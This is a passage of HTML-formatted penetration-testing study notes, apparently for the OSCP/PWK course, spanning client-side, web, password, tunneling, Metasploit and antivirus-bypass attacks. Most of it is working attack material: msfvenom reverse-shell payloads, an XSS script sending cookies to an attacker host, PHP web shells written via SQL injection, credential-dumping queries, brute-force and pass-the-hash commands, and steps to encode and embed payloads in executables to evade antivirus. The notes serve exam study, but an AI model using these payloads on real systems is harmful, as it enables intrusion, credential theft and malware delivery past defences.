style="color:#80ffbb;font-weight:400">int</span>&nbsp;main&nbsp;()<br>{<br><span style="color:#80ffbb;font-weight:400">int</span>&nbsp;i;<br>i=system&nbsp;(<span style="color:#3ad900;font-weight:400">"net&nbsp;localgroup&nbsp;administrators&nbsp;low&nbsp;/add"</span>);<br><span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>}</td></tr></table><br><br>Linux Weak Services :<br>Weak and misconfigured permissions on folders/binaries or SUID, cronjobs, root scripts, etc. <br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#0088ff;font-weight:400">#find&nbsp;all&nbsp;SUID&nbsp;files&nbsp;on&nbsp;system.&nbsp;&nbsp;</span><br><span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-4000&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;<br><br><span style="color:#0088ff;font-weight:400">#find&nbsp;world&nbsp;writable&nbsp;files</span><br><span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-2&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;-type&nbsp;l&nbsp;-ls&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</td></tr></table><br><br><br><br><b><span style="font-size:xx-large;">12. - Client Side Attacks</span></b><br><br>Know Your Target.<br>"The issue with client side attacks, from an attacker’s standpoint, is that the enumeration<br>of the victim client software cannot be done easily."<br><br><span style="text-decoration:underline;">Replacing Shellcode</span><br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>msfvenom&nbsp;-p&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp&nbsp;LHOST=&lt;lhost&gt;&nbsp;LPORT=&lt;lport&gt;&nbsp;-f&nbsp;js_le&nbsp;-e&nbsp;generic<span style="color:#ff9d00;font-weight:700">/</span>none</td></tr></table><br><br>#JSP<br>msfvenom -p java/jsp_shell_reverse_tcp lhost=10.0.0.35 lport=5555<br><br><span style="text-decoration:underline;">Java Applets</span><br><br>Java version 7 complie:<br><br>"Since the release of Kali Linux 2016.2, Java version 7 is not available in the Kali repositories.<br>In order to complete the exercise using the PWK Kali VM 2018.3, the following commands are needed to compile and sign the Java code:"<br><br>/usr/lib/jvm/java-8-openjdk-i386/bin/keytool  <br>/usr/lib/jvm/java-8-openjdk-i386/bin/ jarsigner <br><a href="https://forums.offensive-security.com/showthread.php?18497-12-3-Changes-to-quot-Java-Signed-Applet-Attack">https://forums.offensive-security.com/showthread.php?18497-12-3-Changes-to-quot-Java-Signed-Applet-Attack</a><br><br>javac -source 1.7 -Xlint -target 1.7 JavaApp.java<br><br>echo "Permissions: all-permission" &gt; manifest.txt<br><br>#Warning: Different store and key passwords not supported for PKCS12 KeyStores. <br>keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mykeypass<br><br>jarsigner -keystore mykeystore -storepass mykeypass -keypass mykeypass -signedjar SignedJavaApp.jar JavaApp.jar signapplet<br><br>echo '&lt;applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"&gt;&lt;param name="1" <br>value="<a href="http://10.11.0.5:80/evil.exe"></applet>'">http://10.11.0.5:80/evil.exe"&gt;&lt;/applet&gt;'</a> &gt; java.html<br><br>cp <a href="file:///usr/share/windows-binaries/nc.exe">/usr/share/windows-binaries/nc.exe</a> to current directory &amp; mv nc.exe to evil.exe<br><br>Javadocs:<br><a href="https://docs.oracle.com/javase/tutorial/deployment/jar/signing.html">https://docs.oracle.com/javase/tutorial/deployment/jar/signing.html</a><br><br><b><span style="font-size:xx-large;">13. - Web Application Attacks</span></b><br><br>“A dynamic web application will usually provide a larger attack surface...<br>Depending on the quality of this code and the configuration of the web server, <br>the integrity of the site may be compromised by a malicious visitor” (PWK guide, 2018)<br><br>Firefox extensions:<br>Cookies Manager+55<br>Tamper Data56<br><br><a href="https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/">https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/</a><br><a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/">https://addons.mozilla.org/en-US/firefox/addon/tamper-data/</a><br><br><span style="text-decoration:underline;">Cross Site Scripting (XSS)</span><br><br>XSS vulnerabilities are caused due to unsanitized user input that is then displayed on a web page in HTML format.<br><br>They don't directly compromise a machine, these attacks can still have significant impacts, such as cookie stealing <br>and authentication bypass, redirecting the victim’s browser to a malicious HTML page, and more.<br><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a><br><br><br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>#Injecting&nbsp;JavaScript&nbsp;Into&nbsp;the&nbsp;Form<br><span style="color:#80ffbb;font-weight:400">&lt;script&gt;</span>alert(<span style="color:#3ad900;font-weight:400">"XSS"</span>)<span style="color:#80ffbb;font-weight:400">&lt;/script&gt;</span><br><br>#Invisible&nbsp;iframe,&nbsp;same&nbsp;results&nbsp;but&nbsp;in&nbsp;a&nbsp;stealthier&nbsp;manner.<br><span style="color:#80ffbb;font-weight:400">&lt;iframe</span>&nbsp;<br><span style="color:#cccccc;font-weight:400">SRC="http://&lt;lhost&gt;/reports&nbsp;height&nbsp;=&nbsp;"0</span>"&nbsp;<span style="color:#cccccc;font-weight:400">width&nbsp;="0"</span><span style="color:#80ffbb;font-weight:400">&gt;</span><br><span style="color:#80ffbb;font-weight:400">&lt;/iframe&gt;</span><br><br>#Stealing&nbsp;Cookies&nbsp;and&nbsp;Session&nbsp;Information<br><span style="color:#80ffbb;font-weight:400">&lt;script&gt;</span><br><span style="color:#ff9d00;font-weight:700">new</span>&nbsp;Image().src=<span style="color:#3ad900;font-weight:400">"http://&lt;lhost&gt;/session.php?output="</span>+document.cookie;<br><span style="color:#80ffbb;font-weight:400">&lt;/script&gt;</span></td></tr></table><br><br>Figure 13 - Invisible iframe, browser redirection, may be used to redirect a victim browser to a client side attack<br> or <b>to an information gathering script.</b><br> <br><table style="display:inline-table"><tr><td><img src="images\3-1.png" alt="images\3-1.png" /></td></tr></table><br><br><br><span style="text-decoration:underline;">Local (LFI) and remote (RFI)</span><br><br><a href="https://www.exploit-db.com/papers/13017">https://www.exploit-db.com/papers/13017</a><br><br> These vulnerabilities are commonly found in poorly written PHP code.<br> <br> "LFI vulnerabilities are a subclass of RFIs. The difference between the two is the web<br>application’s capability to include either local or remote files. RFI attacks allow the<br>attacker to introduce his own code to the webserver, resulting in a quick compromise,<br>while LFI attacks limit the attacker to including files already existing on the web server,<br>thus making compromise more challenging."<br><br><b>In versions of PHP below 5.3, we would be able to terminate our request with a null byte (%00)</b><br><br><span style="text-decoration:underline;">LIF's</span><br>Can we write PHP code on the victim's server? <br><br>YES - then we could get a shell.<br><br>NO..? <br><br>• Try Contaminating Log Files. <br>&lt;?php echo shell_exec($_GET['cmd']);?&gt;<br><br>• /var/mail/&lt;user&gt; (if we can write emails to user, use telnet to inject PHP)<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>telnet&nbsp;ip&nbsp;<span style="color:#80ffbb;font-weight:400">&lt;port&gt;</span>&nbsp;<br>helo&nbsp;<span style="color:#80ffbb;font-weight:400">&lt;user&gt;</span>&nbsp;or&nbsp;EHLO&nbsp;me.self.name<br>VRFY&nbsp;<span style="color:#80ffbb;font-weight:400">&lt;user&gt;</span>@localhost<br>mail&nbsp;from:&nbsp;<br>rcpt&nbsp;<span style="color:#80ffbb;font-weight:400">&lt;user&gt;</span>@localhost<br>data<br>Subject:&nbsp;You&nbsp;got&nbsp;owned<br>#PHP&nbsp;$_REQUEST&nbsp;is&nbsp;a&nbsp;PHP&nbsp;super&nbsp;global&nbsp;variable<br>#Used&nbsp;to&nbsp;collect&nbsp;data&nbsp;after&nbsp;submitting&nbsp;an&nbsp;HTML&nbsp;form.<br><span style="color:#ff9d00;font-weight:700">&lt;?php</span>&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;system<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#cccccc;font-weight:400">$_REQUEST[</span>pwaned<span style="color:#cccccc;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">);?&gt;</span><br>#empty&nbsp;space&nbsp;is&nbsp;important&nbsp;for&nbsp;code&nbsp;output.<br><br>.</td></tr></table><br><br><span style="text-decoration:underline;">From LFI to Code Execution</span><br><br><a href="https://awakened1712.github.io/oscp/oscp-lfi-rfi/">https://awakened1712.github.io/oscp/oscp-lfi-rfi/</a><br><br><span style="text-decoration:underline;">Remote File Inclusion</span><br>RFI's  are less common than LFIs<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#0088ff;font-weight:400">&lt;!--&nbsp;Veirfy&nbsp;evil.txt.php&nbsp;has&nbsp;been&nbsp;included--&gt;</span>&nbsp;<br>http://<span style="color:#80ffbb;font-weight:400">&lt;target&gt;</span>/addguestbook.php?name=a&amp;comment=b&amp;LANG=http://<span style="color:#80ffbb;font-weight:400">&lt;rhost&gt;</span>/evil.txt</td></tr></table><br><br><span style="text-decoration:underline;">MySQL SQL Injection</span><br><br>SQL Injection is a common web vulnerability found in dynamic sites that is caused by unsanitized user input, which is then passed on to a database.<br>This can be used to “break out” of the original query, to include more malicious actions.<br><br>These types of vulnerabilities can lead to database information leakage and, depending on the environment, could also lead to complete server compromise<br><br><span style="text-decoration:underline;">Authentication Bypass</span><br><br>#username fields<br>(1)wronguser' or 1=1 limit 1;#order<br>(2) wronguser' or '1=1 -- -' limit 1;#<br>SELECT * FROM users WHERE username='1' or '1=1 -- -' limit 1;#<br><br>#If the username is already known, the only thing to be bypassed is the password verification. <br># (1) &amp; (2) condition is always true and thus bypasses the security. <br><br>(1) ' or '1'='1'  limit 1;#<br>password='' or '1'='1'  limit 1;#<br><br>(2) ' or 1='1' limit 1;#<br>password= '' or 1='1' limit 1;#<br><br><span style="text-decoration:underline;">Enumerating the Database</span><br>SQL injection attacks can be used to disclose database information using various<br>injected queries. Most of these techniques rely on abusing SQL query statements and<br>gathering information about the database structure from the errors.<br><br>We can test this vulnerability by <b>simply adding a quote (or a double quote) </b>after the ID parameter.<br><br><span style="text-decoration:underline;">Column Number Enumeration</span><br><br>Depending on the verbosity of the web application, an attacker could try to use the<br>“order by” output query to gather information about the database structure<br>Increase the number till we get an error. <br>The error provides us with important information, about table columns.<br><br>http://<span style="color:#ff0044;">10.11.1.35</span>/<b><span style="color:#ff9d00;">comment</span></b><b>.php?id=</b><b><span style="color:#ff0044;">738</span></b><b> </b><b><span style="color:#ff9d00;">order</span></b><b> </b><b><span style="color:#ff9d00;">by</span></b><b> </b><b><span style="color:#ff0044;">1</span></b><b><br><br>The “</b><b><span style="color:#ff9d00;">union</span></b><b> </b><b><span style="color:#ff9d00;">all</span></b><b> </b><b><span style="color:#ff9d00;">select</span></b><b>” statement </b><b><span style="color:#ff9d00;">is</span></b><b> useful </b><b><span style="color:#ff9d00;">to</span></b><b> inject </b><b><span style="color:#ff9d00;">as</span></b><b> it allows us </b><b><span style="color:#ff9d00;">to</span></b><b> </b><b><span style="color:#ff9d00;">add</span></b><b> our own </b><b><span style="color:#ff9d00;">select</span></b><b><br>statement </b><b><span style="color:#ff9d00;">to</span></b><b> the original query </b><b><span style="color:#ff9d00;">and</span></b><b> often have the output shown </b><b><span style="color:#ff9d00;">on</span></b><b> the page<br><br>http://</b><b><span style="color:#ff0044;">10.11.1.35</span></b><b>/</b><b><span style="color:#ff9d00;">comment</span></b><b>.php?id=</b><b><span style="color:#ff0044;">738</span></b><b> </b><b><span style="color:#ff9d00;">union</span></b><b> </b><b><span style="color:#ff9d00;">all</span></b><b> </b><b><span style="color:#ff9d00;">select</span></b><b> </b><b><span style="color:#ff0044;">1</span></b><b>,</b><b><span style="color:#ff0044;">2</span></b><b>,</b><b><span style="color:#ff0044;">3</span></b><b>,</b><b><span style="color:#ff0044;">4</span></b><b>,</b><b><span style="color:#ff0044;">5</span></b><b>,</b><b><span style="color:#ff0044;">6</span></b><b><br></b><br><span style="text-decoration:underline;">Extracting Data from the Database</span><br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#0088ff;font-weight:400">--version&nbsp;info</span><br>http://<span style="color:#ff0044;font-weight:400">10.11.16.86</span>/<span style="color:#ff9d00;font-weight:700">comment</span>.php?id=<span style="color:#ff0044;font-weight:400">738</span>&nbsp;<span style="color:#ff9d00;font-weight:700">union</span>&nbsp;<span style="color:#ff9d00;font-weight:700">all</span>&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">2</span>,<span style="color:#ff0044;font-weight:400">3</span>,<span style="color:#ff0044;font-weight:400">4</span>,@@version,<span style="color:#ff0044;font-weight:400">6</span><br><br><span style="color:#0088ff;font-weight:400">--current&nbsp;user</span><br>http://<span style="color:#ff0044;font-weight:400">10.11.1.35</span>/<span style="color:#ff9d00;font-weight:700">comment</span>.php?id=<span style="color:#ff0044;font-weight:400">738</span>&nbsp;<span style="color:#ff9d00;font-weight:700">union</span>&nbsp;<span style="color:#ff9d00;font-weight:700">all</span>&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">2</span>,<span style="color:#ff0044;font-weight:400">3</span>,<span style="color:#ff0044;font-weight:400">4</span>,<span style="color:#cccccc;font-weight:400">user</span>(),<span style="color:#ff0044;font-weight:400">6</span><br><br><span style="color:#0088ff;font-weight:400">--enum&nbsp;tables&nbsp;and&nbsp;column&nbsp;structures&nbsp;using&nbsp;MySQL&nbsp;information&nbsp;schema</span><br>http://<span style="color:#ff0044;font-weight:400">10.11.1.35</span>/<span style="color:#ff9d00;font-weight:700">comment</span>.php?id=<span style="color:#ff0044;font-weight:400">738</span>&nbsp;<span style="color:#ff9d00;font-weight:700">union</span>&nbsp;<span style="color:#ff9d00;font-weight:700">all</span>&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">2</span>,<span style="color:#ff0044;font-weight:400">3</span>,<span style="color:#ff0044;font-weight:400">4</span>,table_name,<span style="color:#ff0044;font-weight:400">6</span>&nbsp;<span style="color:#ff9d00;font-weight:700">FROM</span>&nbsp;information_schema.tables<br><br>&nbsp;<span style="color:#0088ff;font-weight:400">--target&nbsp;specific&nbsp;table&nbsp;in&nbsp;the&nbsp;db,&nbsp;e.g,&nbsp;display&nbsp;columns&nbsp;for&nbsp;the&nbsp;users&nbsp;table</span><br>http://<span style="color:#ff0044;font-weight:400">10.11.1.35</span>/<span style="color:#ff9d00;font-weight:700">comment</span>.php?id=<span style="color:#ff0044;font-weight:400">738</span>&nbsp;<span style="color:#ff9d00;font-weight:700">union</span>&nbsp;<span style="color:#ff9d00;font-weight:700">all</span>&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">2</span>,<span style="color:#ff0044;font-weight:400">3</span>,<span style="color:#ff0044;font-weight:400">4</span>,column_name,<span style="color:#ff0044;font-weight:400">6</span>&nbsp;<span style="color:#ff9d00;font-weight:700">FROM</span>&nbsp;information_schema.columns&nbsp;<span style="color:#ff9d00;font-weight:700">where</span>&nbsp;table_name=<span style="color:#3ad900;font-weight:400">'users'</span><br><br>&nbsp;<span style="color:#0088ff;font-weight:400">--extract&nbsp;name&nbsp;and&nbsp;password&nbsp;values&nbsp;from&nbsp;the&nbsp;users&nbsp;tables</span><br>http://<span style="color:#ff0044;font-weight:400">10.11.1.35</span>/<span style="color:#ff9d00;font-weight:700">comment</span>.php?id=<span style="color:#ff0044;font-weight:400">738</span>&nbsp;<span style="color:#ff9d00;font-weight:700">union</span>&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,<span style="color:#ff0044;font-weight:400">2</span>,<span style="color:#ff0044;font-weight:400">3</span>,<span style="color:#ff0044;font-weight:400">4</span>,<span style="color:#cccccc;font-weight:400">concat</span>(name,0x3a,password),<span style="color:#ff0044;font-weight:400">6</span>&nbsp;<span style="color:#ff9d00;font-weight:700">FROM</span>&nbsp;users</td></tr></table><br><br><span style="text-decoration:underline;">From SQL Injection to Code Execution</span><br><br><a href="http://kaoticcreations.blogspot.com/p/basic-sql-injection-101.html">http://kaoticcreations.blogspot.com/p/basic-sql-injection-101.html</a><br><br>"Depending on the operating system, service privileges, and filesystem permissions, SQL<br>injection vulnerabilities may be used to read and write files on the underlying operating<br>system." PWK guide(2018).<br><br>Can we read files? MySQL load_file('&lt;file_name&gt;') an read files on the system<br><br><a href="http://10.11.16.86/comment.php?i">http://10.11.16.86/comment.php?</a>id=736 union select 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts') ,6 FROM users<br><br>Can we create evil.php in web root? MySQL INTO OUTFILE ‘&lt;full_path_file_name&gt;’<br><br><a href="http://10.11.16.86/comment.php?i">http://10.11.16.86/comment.php?i</a>d=736 union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'<br><br> <br><span style="text-decoration:underline;">Web Application Proxies</span> - On many occasions, a web application may restrict the input given by a user.<br><br>1. A parameter is vulnerable to SQL injection (i.e, is not sanitized).<br>2. But the web application interface does not allow for easy modification of this vulnerable parameter.<br>3. It could be a POST request, i.e no easy parameter modification through URL manipulation.<br><br>Cases 1, 2, and 3 can be avoided by using a local web proxy like Burb Suite or Tamper Data.<br><br><br><span style="text-decoration:underline;">Automated SQL Injection Tools</span><br><br>The sqlmap tool can be used to both identify and exploitSQL injection vulnerabilities.<br><br>#sqlmap crawl parameter to enum pages <br><br>sqlmap -u <a href="http://10.11.1.35">http://</a>&lt;rhost&gt; --crawl=1<br><br>#dump database,  after an injection point is found<br><br>sqlmap -u <a href="http://10.11.1.35/comment.php?id=738">http://&lt;rhost&gt;/injection.php?id=738</a> --dbms=mysql --dump --threads=5<br><br>#dump all<br>sqlmap -u <a href="http://10.11.16.86/comment.php?id=736">http://10.11.16.86/comment.php?id=736</a> --dbms=mysql --dump-all --threads=5<br><br><b><span style="font-size:xx-large;">14. - Password Attacks</span></b><br><br>If a service of some sort requires valid credentials to access it, we can simply attempt to guess, or brute-force,<br>these credentials until they are identified.<br><br>"Generally speaking, the passwords used in our guessing attempts can come from two<br>sources: dictionary files[like rockyou.txt on kali] or key-space brute-force."<br><br><span style="text-decoration:underline;">Crunch - Key-space Brute Force</span><br>crunch 6 6 0123456789ABCDEF -o crunch1.txt<br><br>You notice the following trend in the password structure.<br>[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]<br><br>#The resulting command to generate our required password list would look similar to:<br>crunch 8 8 -t ,@@^^%%%<br><br><span style="text-decoration:underline;">In Memory Attacks : Pwdump and Fgdump</span><br><br>/usr/share/windows-binaries/fgdump/fgdump.exe<br><br>#Must be admin to run<br>C:\&gt;fgdump.exe<br><br><b>Windows Credentials Editor (WCE)</b> is a security tool that allows one to perform<br>several attacks to obtain clear text passwords and hashes from a compromised<br>Windows host.<br><br>WCE is able to steal credentials either by using DLL injection or by directly reading the LSASS process memory.<br><br>/usr/share/wce/wce32.exe                                                                             │<br>/usr/share/wce/wce64.exe <br><br><br>Passing the Hash Techniques<br><br><br><span style="text-decoration:underline;">Password Profiling</span><br><br>This involves<b> using words and phrases taken from the specific organization you are targeting</b> and including them in<br>your wordlists with the aim of improving your chances of finding a valid password.<br><br>Scenario:<br>A Nano-Technology company, had an administrator that used the password “nanobots93” to secure one of his network machines .<br><br>Cewl,  can scrape example.com  to generate a password list from words found on the web pages.<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>cewl&nbsp;www.example.com&nbsp;-m&nbsp;6&nbsp;-w&nbsp;example-cewl.txt</td></tr></table><br><br><span style="text-decoration:underline;">Password Mutating</span><br><br>Users most commonly tend to mutate their passwords in various ways. This could<br>include adding a few numbers at the end of the password, swapping out lowercase for<br>capital letters, changing certain letters to numbers, etc.<br><br>John The Ripper - add common mutation sequences to a password list.<br><br>#Edit config file to add new line for mutation <br>vim  /etc/john/john.conf <br><br># Add two numbers to the end of each password<br>$[0-9]$[0-9]<br><br>john --wordlist=example-cewl.txt --rules --stdout &gt; mutated.txt<br><br><span style="text-decoration:underline;">Online Password Attacks Tools</span>: Brute Force - Examples<br><br>Because online password brute-forcing are noisy, they can lead to account lockouts and log alerts.<br>The golden rule is choosing your targets, user lists, and password files carefully and intelligently<br>before initiating the attack.<br><br>• Hydra<br>• Medusa<br>• Ncrack<br>• Metasploit<br><br>In order to be able to automate a password attack against a given networked service, <br>we must be able to generate authentication requests for the specific protocol in use by that service.<br>Services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc.<br><br>SNMP <br>hydra -P password-file.txt -v &lt;rhost&gt; snmp<br><br>SSH <br>hydra -l root -P password-file.txt &lt;rhost&gt; ssh<br><br>FTP <br>hydra -l admin -P password-file.txt -v &lt;rhost&gt; ftp<br><br>HTTP <br>medusa -h &lt;rhost&gt; -u admin -P password-file.txt -M http -m  DIR:/&lt;path&gt; -T 10<br><br>RDP <br>ncrack -vv --user admin -P password-file.txt rdp://&lt;rhost&gt;<br><br><span style="text-decoration:underline;">Password Hash Attacks - Password Cracking </span><br><br>In cryptanalysis, password cracking is the process of recovering the clear text passphrase, given its stored hash value.<br><br>Once the hash type is known, a common approach to password cracking is to simulate the authentication process by repeatedly trying<br>guesses for the password and comparing the newly-generated digest with a stolen or dumped hash.<br><br>Hash Properties:<br>• The length of the hash (each hash function has a specific output length).<br>• The character-set used in the hash.<br>• Any special characters that may be present in the hash.<br><br>Tools<br>hash-identifier<br>John<br><br>#brute-force mode<br>john 127.0.0.1.pwdump<br><br>#wordlist <br>john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump<br><br>#rules<br>john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump<br><br>#linux hashes<br>unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt<br><br><span style="text-decoration:underline;">Pass-The-Hash - Windows </span><br><br>The technique, known as Pass-The-Hash (PTH), allows an attackerto authenticate to a remote target <br>by using a valid combination of username and NTLM/LM hash rather than a cleartext password.<br><br>#Setup SMBHASH<br>export SMBHASH=aad3b435b51404eeaad3b435b51404ee:&lt;NTLM/LM HASH&gt;<br><br>#Use pth-winexe<br>pth-winexe -U administrator% //&lt;rhost&gt; cmd<br><br>https://www.tarlogic.com/en/blog/how-kerberos-works/<br>https://www.tarlogic.com/en/blog/how-to-attack-kerberos/<br><br><span style="font-size:xx-large;">How to attack Kerberos?</span><br><br>   1.  Kerberos brute-force<br>   2.  ASREPRoast<br>   3.  Kerberoasting<br>   4.  Pass the key<br>   5.  Pass the ticket<br>   6.  Silver ticket<br>   7.  Golden ticket<br><br><br><b><span style="font-size:xx-large;">15. - Port Redirection and Tunneling</span></b><br><br>Tunneling a protocol involves encapsulating it within a different payload protocol<br>than the original. <br><br>By using tunneling techniques, it's possible to carry a given protocol<br>over an incompatible delivery-network, or to provide a secure path through an<br>untrusted network.<br><br><br><span style="text-decoration:underline;">Port Forwarding/Redirection</span><br><br>It involves accepting traffic on a given IP address and port and then simply<br>redirecting it to a different IP address and port. <br><br>#rinetd<br>pt-get install rinetd<br>cat /etc/rinetd.conf<br><br><span style="text-decoration:underline;">SSH Tunneling</span><br> <br>Create encrypted tunnels within the SSH protocol, <br>which supports bi-directional communication channels<br><br><span style="text-decoration:underline;">Local Port Forwarding</span><br><br>Tunnel a local port to a remote server, using SSH as the transport protocol:<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&lt;gateway&gt;&nbsp;-L&nbsp;&lt;lport&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;rhost&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;rport&gt;</td></tr></table><br><br><span style="text-decoration:underline;">Remote Port Forwarding</span><br><br>SSH remote port forwarding allows us to tunnel a remote port to a local server:<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&lt;gateway&gt;&nbsp;-R&nbsp;&lt;rport&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;lhost&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;lport&gt;</td></tr></table><br><br><span style="text-decoration:underline;">Dynamic Port Forwarding</span><br><br>SSH dynamic port forwarding allows us to set a local listening port and have it <br>tunnel incoming traffic to any remote destination through a proxy.<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;-D&nbsp;&lt;lproxyport&gt;&nbsp;-p&nbsp;&lt;rport&gt;&nbsp;&lt;target&gt;</td></tr></table><br><br><span style="text-decoration:underline;">Proxychains</span><br><br>Proxychains enables us to run any network tool through HTTP, SOCKS4, and SOCKS5 proxies.<br><br>#create a reverse SSH tunnel to our attacking machine<br>ssh -f -N -R 2222:127.0.0.1:22 root@208.68.234.100<br><br>#ssh the webserver on port 2222<br>ssh -f -N -D 127.0.0.1:8080 -p 2222 hax0r@127.0.0.1<br><br>#proxychains, we can use nmap to scan the internal remote network<br>proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24<br><br><span style="text-decoration:underline;">HTTP Tunneling</span><br><br>HTTP Tunneling is a technique whereby a payload protocol is encapsulated within the<br>HTTP protocol84, usually as the body of a HTTP GET or POST request.<br><br>nc -vvn 192.168.1.130 8888<br><br><span style="text-decoration:underline;">Traffic Encapsulation</span><br><br>In this case, we can use an HTTP or SSL encapsulating tool such as HTTPTunnel or stunnel, respectively.<br><br><br><b><span style="font-size:xx-large;">16. - The Metasploit Framework</span></b><br><br>Building Your Own MSF Module is possible.<br><br>An exploit framework is a system that contains development tools geared toward exploit development and usage. <br>The frameworks standardize the exploit usage syntax and provide dynamic shellcode capabilities.<br><br>Kali Linux contains the metasploit-framework package, which contains the open source elements of the Metasploit project.<br><br>systemctl start postgresql<br>msfconsole<br><br>Auxiliary Modules - provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, etc<br>msf &gt; show auxiliary<br>msf&gt; use auxiliary/scanner/snmp/snmp_enum<br><br>#WebDAV servers are often poorly configured and can often lead to a quick and easy shell on a victim.<br>msf&gt;  use auxiliary/scanner/http/webdav_scanner<br><br><span style="text-decoration:underline;">Metasploit Database Access</span><br><br><br>If the postgresql services is started ahead of time, the MSF will log findings and<br>information about discovered hosts in a convenient, accessible database. To display all<br>discovered hosts up to this point, we can give the hosts command within msfconsole<br><br>msf &gt; hosts<br><br>db_nmap MSF wrapper to scan hosts with Nmap andhave the scan output inserted to the MSF database.<br><br>msf &gt; db_nmap 10.11.1.1-254<br><br><span style="text-decoration:underline;">Exploit Modules</span><br>Take note of the Exploit Target. This is essentially a list of various OS versions or<br>software versions which the exploit is know to work for<br><br><span style="text-decoration:underline;">Staged vs. Non-Staged Payloads</span><br><br>A non-staged payload is a payload that is sent in its entirety in one go – as we’ve been<br>doing up to now. A staged payload is usually sent in two parts.<br><br>Situations to use staged shellcode<br><br>• The vulnerability we are exploiting does not have enough buffer space to hold a full payload<br>• Antivirus software is detecting embedded shellcode in an exploit<br><br>msfvenom can inject a payload into an existing PE executable, which further reduces the chances of AV detection.<br><br><b><span style="font-size:xx-large;">17. - Bypassing Antivirus Software</span></b><br><br>As briefly explained earlier, antivirus systems are mostly considered a “blacklist technology”, whereby known signatures <br>of malware are searched for on the file system and quarantined if found.<br><br>Bypassing antivirus  involves changing or encrypting the contents of a known malicious file so as to change its binary structure. <br>By doing so, the known signature for the malicious file is no longer relevant and the new file structure may fool <br>the antivirus software into ignoring this file.<br><br><br>The presence, type, and version of any antivirus software or similar software should be identified before uploading files to the target machine.<br>Gather as much information as possible about it and test any files you wish to upload to the target machine in a lab environment.<br>Avoiding antivirus signatures by manually editing the binary file requires a deeper understanding PE's structure and assembly programming.<br><br><span style="text-decoration:underline;">Kali Tools</span><br><br>• Encoding Payloads with msfvenom<br><br>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -o shell_reverse.exe<br>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe<br><br>#embedding our shellcode in a non-malicious PE executable<br><br>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e  x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o<br>shell_reverse_msf_encoded_embedded.exe<br><br>• Crypting Known Malware with Software Protectors<br><br>Hyperion the open source crypter.<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>root@kali<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;shell_reverse_msf_encoded_embedded.exe&nbsp;backdoor.exe<br>root@kali<span 